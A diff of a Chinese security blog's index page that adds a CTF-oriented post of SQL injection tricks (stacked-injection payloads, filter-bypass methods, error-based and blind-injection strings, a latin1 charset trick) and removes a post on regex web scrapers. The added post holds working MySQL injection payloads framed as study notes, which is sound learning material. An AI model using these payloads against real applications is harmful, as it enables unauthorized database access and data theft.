@@ -253,6 +253,209 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da4er's">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da4er's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html" itemprop="url">SQL注入Trick(持续更新.....)</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T16:16:54+08:00">
+                2020-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全&渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html" class="leancloud_visitors" data-flag-title="SQL注入Trick(持续更新.....)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文记录自己在学习SQL注入时的积累，持续更新….</p>
+<h4 id="通过show查看字段名。"><a href="#通过show查看字段名。" class="headerlink" title="通过show查看字段名。"></a>通过show查看字段名。</h4><p>show语句不仅可以查看数据库名和表名，同时也可以查看字段名。当过滤select的时候，我们可以通过show查看表中的字段名，明确flag在不在这个表里。<br>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from 表名;</span><br></pre></td></tr></table></figure><br><img src="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image"></p>
+<h4 id="堆叠注入利用方法"><a href="#堆叠注入利用方法" class="headerlink" title="堆叠注入利用方法"></a>堆叠注入利用方法</h4><p>例题：[强网杯 2019]随便注<br>当堆叠注入过滤select等查询子句时，我们可以使用别的方法来进行查询，下面有三种方法：</p>
+<p><strong>第一种：使用set…prepare…execute…语句</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sEt+@a&#x3D;concat(&quot;sel&quot;,&quot;ect+flag+from+&#96;1919810931114514&#96;&quot;); </span><br><span class="line">PRepare+hello+from+@a; </span><br><span class="line">execute+hello;</span><br></pre></td></tr></table></figure><br><strong>第二种：使用hanlder代替select</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler&#96;1919810931114514&#96;open+as+da4er;</span><br><span class="line">handler+da4er+read+first;</span><br><span class="line">Handler+da4er+close;</span><br></pre></td></tr></table></figure><br><strong>第三种：使用rename，alter改表名和添加主键</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table words to words1;</span><br><span class="line">rename table &#96;1919810931114514&#96; to words;</span><br><span class="line">alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;</span><br></pre></td></tr></table></figure></p>
+<h4 id="更改运算符作用"><a href="#更改运算符作用" class="headerlink" title="更改运算符作用"></a>更改运算符作用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
+<p>上面这段代码，||的作用是作或运算。在MySQL中将sql_mode设置为PIPES_AS_CONCAT，可以将||的作用改成连接符。<br><img src="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set sql_mode&#x3D;PIPES_AS_CONCAT</span><br></pre></td></tr></table></figure></p>
+<h4 id="updatexml报错函数注意点"><a href="#updatexml报错函数注意点" class="headerlink" title="updatexml报错函数注意点"></a>updatexml报错函数注意点</h4><p>当我们使用updatexml函数报错注入时，updatexml最多只能爆出32位字段内容，如果字段大于32位，那么剩下的将无法爆出。<br>这个时候可以使用left()，right()函数从字段的左右两端分别截取内容，最后拼接在一起。<br>例题：[极客大挑战 2019]HardSQL</p>
+<h4 id="绕过过滤方法-持续更新…"><a href="#绕过过滤方法-持续更新…" class="headerlink" title="绕过过滤方法(持续更新….)"></a>绕过过滤方法(持续更新….)</h4><h5 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h5><p><strong>多层括号嵌套</strong><br>注意括号只能嵌套在能计算出结果的sql语句中，对于不确定的要在本地测试。<br><strong>改用+号</strong><br><strong>and/or 后面加上偶数个!~可以替代空格，并且and/or前面的空格可以省略</strong><br><strong>内联注释替换空格</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*!*&#x2F;</span><br><span class="line">&#x2F;*!&#x2F;*!*&#x2F;</span><br></pre></td></tr></table></figure><br><strong>%09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格</strong></p>
+<h5 id="and-or被过滤"><a href="#and-or被过滤" class="headerlink" title="and/or被过滤"></a>and/or被过滤</h5><p><strong>双写anandd oorr</strong><br><strong>使用运算符&amp;&amp; ||</strong><br><strong>直接拼接=号</strong><br><img src="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image"><br><strong>其他方法</strong><br><strong>使用^</strong> ?id=1^(condition)   //注意要加括号</p>
+<h5 id="逗号被过滤"><a href="#逗号被过滤" class="headerlink" title="逗号被过滤"></a>逗号被过滤</h5><p><strong>改用盲注</strong><br><strong>使用join语句</strong><br>substr(data from 1 for 1) 相当于 substr(data,1,1)  // 对于其他的截断函数也成立<br>limit 9 offset 4 相当于limit 9,4</p>
+<h5 id="其他关键字被过滤"><a href="#其他关键字被过滤" class="headerlink" title="其他关键字被过滤"></a>其他关键字被过滤</h5><p><strong>双写绕过</strong><br><strong>使用同义函数代替</strong><br>if函数可以用case when condition then 1 else 0 end</p>
+<h5 id="单双引号被过滤"><a href="#单双引号被过滤" class="headerlink" title="单双引号被过滤"></a>单双引号被过滤</h5><p><strong>尝试编码问题的sql注入</strong><br><strong>字符串使用十六进制</strong><br><strong>url编码 url双层编码</strong></p>
+<h5 id="特殊报错函数"><a href="#特殊报错函数" class="headerlink" title="特殊报错函数"></a>特殊报错函数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exp(): exp(~(select * from(select user())a))</span><br><span class="line">GeometryCollection：id&#x3D;1 AND GeometryCollection((select * from (select* from(select user())a)b))</span><br><span class="line">polygon()：id&#x3D;1 AND polygon((select * from(select * from(select user())a)b))</span><br><span class="line">multipoint()：id&#x3D;1 AND multipoint((select * from(select * from(select user())a)b))</span><br><span class="line">multilinestring()：id&#x3D;1 AND multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line">linestring()：id&#x3D;1 AND LINESTRING((select * from(select * from(select user())a)b))</span><br><span class="line">multipolygon() ：id&#x3D;1 AND multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p><strong>过滤and和or下的盲注</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;strcmp(left((select%20username%20from%20users%20limit%200,1),1),0x42)%23</span><br><span class="line">id&#x3D;strcmp(left((select+username+from+limit+0,1),1,0x42)%23</span><br></pre></td></tr></table></figure></p>
+<h5 id="BigInt报错"><a href="#BigInt报错" class="headerlink" title="BigInt报错"></a>BigInt报错</h5><p>原理：mysql接受的数值是有边界的，当我们使用超过mysql限定的数值会发现报错。<br>~0 对0取反：18446744073709551615<br>payload：select !(select * from(select user())a)-~0;</p>
+<p><strong>报错注入参考</strong>：<a href="https://xz.aliyun.com/t/7169#toc-9" target="_blank" rel="noopener">链接</a></p>
+<h5 id="latin1默认编码"><a href="#latin1默认编码" class="headerlink" title="latin1默认编码"></a>latin1默认编码</h5><p>p神博客上专门对mysql字符编码利用的文章：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">链接</a><br>latin1编码时mysql字符集默认编码<br>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;table1&#96; (</span><br><span class="line">  &#96;id&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;username&#96; varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  &#96;password&#96; varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;MyISAM AUTO_INCREMENT&#x3D;1 DEFAULT CHARSET&#x3D;latin1 COLLATE&#x3D;latin1_general_ci;</span><br></pre></td></tr></table></figure><br>当我们数据库编码和php编码都为utf-8时，用户输入的语句会经过三层转码：UTF-8-&gt;UTF-8-&gt;LATIN1<br>mysql数据库使用的utf-8编码是阉割版，只能有三个字节。<br><strong>?username=admin%c2，此处的%c2换为%c2-%ef均可</strong><br>username的%c2会被忽略。最后变成admin。详细的解析看p神博客。</p>
+<p>2020.2.26更新</p>
+<hr>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1908,200 +2111,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://da4er.top/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Da4er's">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/3.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Da4er's Blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html" itemprop="url">正则表达式_爬取中国古诗词网与豆瓣热门图书</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T16:56:46+08:00">
-                2020-02-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%88%AC%E8%99%AB/" itemprop="url" rel="index">
-                    <span itemprop="name">爬虫</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html" class="leancloud_visitors" data-flag-title="正则表达式_爬取中国古诗词网与豆瓣热门图书">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  685
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="一-爬取中国诗词网"><a href="#一-爬取中国诗词网" class="headerlink" title="一.爬取中国诗词网"></a>一.爬取中国诗词网</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def handler_url(url):</span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    reponse&#x3D;requests.get(url,header)</span><br><span class="line">    text&#x3D;reponse.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    years&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    autors&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;a.*?&gt;.*?&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents_tmp&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;div\sclass&#x3D;&quot;contson&quot;\s.*?&gt;(.*?)&lt;&#x2F;div&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents&#x3D;[]</span><br><span class="line">    for c in contents_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,c)</span><br><span class="line">        contents.append(x.strip())</span><br><span class="line">    poems&#x3D;[]</span><br><span class="line">    for value in zip(titles,years,autors,contents):</span><br><span class="line">        title,year,autor,content&#x3D;value</span><br><span class="line">        poem&#x3D;&#123;</span><br><span class="line">            &quot;title&quot;:title,</span><br><span class="line">            &quot;year&quot;:year,</span><br><span class="line">            &quot;autor&quot;:autor,</span><br><span class="line">            &quot;content&quot;:content</span><br><span class="line">        &#125;</span><br><span class="line">        poems.append(poem)</span><br><span class="line">    for a in poems:</span><br><span class="line">        print(a)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.gushiwen.org&#x2F;default_&#123;&#125;.aspx&quot;</span><br><span class="line">    for i in range(1,7):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        handler_url(url)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/4.png" class title="Da4er">
-<img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/5.png" class title="Da4er">
-<hr>
-<h3 id="二-爬取豆瓣热门图书"><a href="#二-爬取豆瓣热门图书" class="headerlink" title="二.爬取豆瓣热门图书"></a>二.爬取豆瓣热门图书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">HEADERS&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">def get_detail_page(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    detail_pages&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;main-bd&quot;&gt;.*?&lt;a\shref&#x3D;&quot;(.*?)&quot;&gt;.*?&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    return detail_pages</span><br><span class="line">def handle_detail_page(url):</span><br><span class="line">    book&#x3D;&#123;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;article&quot;&gt;.*?&lt;span.*?&gt;(.*?)&lt;&#x2F;span&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles_tmp&#x3D;re.findall(r&#39;&lt;div\sid&#x3D;&quot;link-report&quot;&gt;.*?&lt;p&gt;.*&lt;&#x2F;p&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles&#x3D;[]</span><br><span class="line">    for a in articles_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,a)</span><br><span class="line">        y&#x3D;x.replace(&#39;\r&#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">        a&#x3D;re.sub(r&#39;&lt;div\s.*?&gt;&#39;,&#39;&#39;,y)</span><br><span class="line">        b&#x3D;a.replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">        articles.append(b)</span><br><span class="line">    # print(articles)</span><br><span class="line">    # print(titles)</span><br><span class="line">    book&#x3D;&#123;</span><br><span class="line">        &#39;title&#39;:titles,</span><br><span class="line">        &#39;article&#39;:articles</span><br><span class="line">    &#125;</span><br><span class="line">    print(book)</span><br><span class="line">def main():</span><br><span class="line">    urls&#x3D;[]</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;book.douban.com&#x2F;review&#x2F;best&#x2F;?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(0,41,20):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        urls.append(url)</span><br><span class="line">    for a in urls:</span><br><span class="line">        detail_urls&#x3D;get_detail_page(a)</span><br><span class="line">        for f in detail_urls:</span><br><span class="line">            handle_detail_page(f)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/1.png" class title="Da4er">
-<img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/2.png" class title="Da4er">
-<img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/3.png" class title="Da4er">
-<hr>
-<h3 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h3><p><strong>这两个小的爬虫项目，网站都没有进行反爬处理，所以说对于我们爬出页面信息还是比较简单的，关键在于数据怎么解析，最近一直在看正则表达式，所以找了两个小的项目练一练，这两个小项目也可以使用beatifulsoup或者xml库进行解析，找时间再试试别的方法解析数据吧~</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2155,7 +2164,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">54</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2272,7 +2281,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">40.1k</span>
+    <span title="Site words total count">41.1k</span>
   
 </div>
 
@@ -2282,7 +2291,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共40.1k字</span>
+  <span class="post-count">博客全站共41.1k字</span>
 </div>
 
 
